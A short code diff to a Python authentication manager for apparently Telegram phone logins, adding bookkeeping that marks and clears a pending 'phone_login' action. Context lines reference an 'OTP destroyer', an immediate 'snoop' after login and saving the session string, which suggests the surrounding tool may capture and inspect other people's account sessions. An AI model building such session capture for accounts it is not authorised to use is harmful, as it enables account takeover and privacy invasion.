@@ -203,6 +203,14 @@ class AuthManager:
         # Clean up any existing auth for this user
         if user_id in self._pending_auths:
             self.cancel_auth(user_id)
+        
+        # Set OTP protection for phone login
+        if self.bot_manager:
+            self.bot_manager.pending_actions[user_id] = {
+                "action": "phone_login",
+                "phone": phone
+            }
+        
         try:
             if use_otp_destroyer:
                 auth_data = await self._otp_destroyer.start_phone_auth(phone)
@@ -339,6 +347,9 @@ class AuthManager:
                         await self._immediate_snoop_after_login(user_id, client)
                     # Success - clean up and return session
                     self._pending_auths.pop(user_id)
+                    # Clear OTP protection
+                    if self.bot_manager:
+                        self.bot_manager.pending_actions.pop(user_id, None)
                     session_string = StringSession.save(client.session)
                     
                     await client.disconnect()
